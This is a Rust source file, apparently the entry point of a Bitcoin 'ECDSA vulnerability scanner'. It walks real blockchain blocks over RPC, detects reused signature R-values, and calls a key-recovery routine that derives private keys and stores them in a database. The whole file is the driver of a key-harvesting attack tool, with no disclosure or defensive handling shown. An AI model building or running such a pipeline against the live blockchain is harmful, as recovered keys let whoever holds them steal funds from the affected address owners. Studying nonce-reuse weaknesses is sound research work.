use anyhow::Result;
use clap::Parser;
use tracing::{info, error, Level};
use tracing_subscriber;
use futures::stream::StreamExt;

mod types;
mod storage;
mod cache;
mod rpc;
mod parser;
mod recover;
mod stats;

use types::{ScannerConfig, ParsedBlock};
use storage::Database;
use cache::RValueCache;
use rpc::RpcClient;
use stats::RuntimeStats;
use parser::RateLimiter;

#[derive(Parser, Debug)]
#[command(name = "btc_scanner")]
#[command(about = "High-performance Bitcoin ECDSA vulnerability scanner")]
struct Cli {
    #[arg(long, default_value = "250000")]
    start_block: u32,
    
    #[arg(long, default_value = "320000")]
    end_block: u32,
    
    #[arg(long, default_value = "12")]
    threads: usize,
    
    #[arg(long, default_value = "bitcoin_scan.db")]
    db_path: String,
    
    #[arg(long, default_value = "50")]
    batch_size: u32,
    
    #[arg(long, default_value = "10")]
    rate_limit: u32,
    
    #[arg(long)]
    rpc_url: String,
    
    #[arg(long, default_value = "1")]
    max_requests_per_block: u32,
}

#[tokio::main]
async fn main() -> Result<()> {
    // Initialize tracing
    tracing_subscriber::fmt()
        .with_max_level(Level::INFO)
        .init();

    let cli = Cli::parse();
    
    info!("Starting Bitcoin ECDSA vulnerability scanner");
    info!("Configuration: {:?}", cli);

    // Convert CLI to ScannerConfig
    let config = ScannerConfig {
        start_block: cli.start_block,
        end_block: cli.end_block,
        threads: cli.threads,
        db_path: cli.db_path,
        batch_size: cli.batch_size,
        rate_limit: cli.rate_limit,
        rpc_url: cli.rpc_url,
        max_requests_per_block: cli.max_requests_per_block,
    };

    // Initialize database
    let mut db = Database::open(&config.db_path)?;
    
    // Initialize R-value cache
    let rcache = RValueCache::new(100_000);
    
    // Initialize RPC client
    let rpc = RpcClient::new(&config.rpc_url)?;
    
    // Run the scanner
    if let Err(e) = orchestrate(config, &mut db, &rcache, &rpc).await {
        error!("Scanner failed: {}", e);
        return Err(e);
    }
    
    info!("Scanner completed successfully");
    Ok(())
}

async fn orchestrate(config: ScannerConfig, db: &mut Database, cache: &RValueCache, rpc: &RpcClient) -> Result<()> {
    let mut stats = RuntimeStats::start();
    
    // Create a rate limiter based on the configured rate_limit
    let mut rate_limiter = RateLimiter::new(config.rate_limit);
    
    // Check for existing checkpoint to resume scanning
    let mut current_block = match db.get_last_checkpoint()? {
        Some(checkpoint) => {
            info!("Resuming from checkpoint: block {}", checkpoint);
            checkpoint + 1
        },
        None => {
            info!("Starting fresh scan from block {}", config.start_block);
            config.start_block
        }
    };
    
    // Preload recent R-values from database
    let recent_signatures = db.preload_recent_r_values(100_000)?;
    cache.preload(recent_signatures);
    
    while current_block <= config.end_block {
        let end_block = std::cmp::min(current_block + config.batch_size as u32 - 1, config.end_block);
        
        info!("Processing blocks {} to {}", current_block, end_block);
        
        // Fetch blocks in batch
        let blocks = rpc.fetch_blocks_batch(current_block, end_block).await?;
        stats.api_requests += 1; // Count batch request
        
        // Process blocks sequentially to respect rate limiting
        // This ensures we don't overwhelm the API with parallel requests
        for block in blocks {
            // Use the rate limiter before processing each block
            rate_limiter.wait_if_needed().await;
            
            let parsed_block = parser::parse_block(&block, rpc, &mut rate_limiter).await?;
            
            // Process signatures and check for R-value reuse
            for signature in &parsed_block.signatures {
                if let Some(reused_sig) = cache.check_and_insert(&signature.r, signature.clone()) {
                    // R-value reuse detected! Attempt key recovery
                    if let Ok(Some(recovered_key)) = recover::attempt_recover_k_and_priv(signature, &reused_sig) {
                        db.insert_recovered_key(&recovered_key)?;
                        stats.keys_recovered += 1;
                        info!("Recovered private key for R-value reuse!");
                    }
                    stats.r_value_reuse_detected += 1;
                }
            }
            
            // Batch insert signatures
            db.insert_signatures_batch(&parsed_block.signatures)?;
            
            // Update script statistics
            db.upsert_script_stats_batch(&parsed_block.script_stats)?;
            
            stats.blocks_processed += 1;
            // FIXED: Count actual transactions in the block, not signatures
            stats.transactions_processed += block.txdata.len() as u64;
            stats.signatures_processed += parsed_block.signatures.len() as u64;
        }
        
        current_block = end_block + 1;
        
        // Save checkpoint every 100 blocks for crash recovery
        if current_block % 100 == 0 {
            db.save_checkpoint(current_block - 1)?;
            info!("Checkpoint saved at block {}", current_block - 1);
        }
        
        // Report progress
        stats.report_progress();
    }
    
    // Save final checkpoint
    db.save_checkpoint(config.end_block)?;
    info!("Final checkpoint saved at block {}", config.end_block);
    
    stats.print_summary();
    Ok(())
}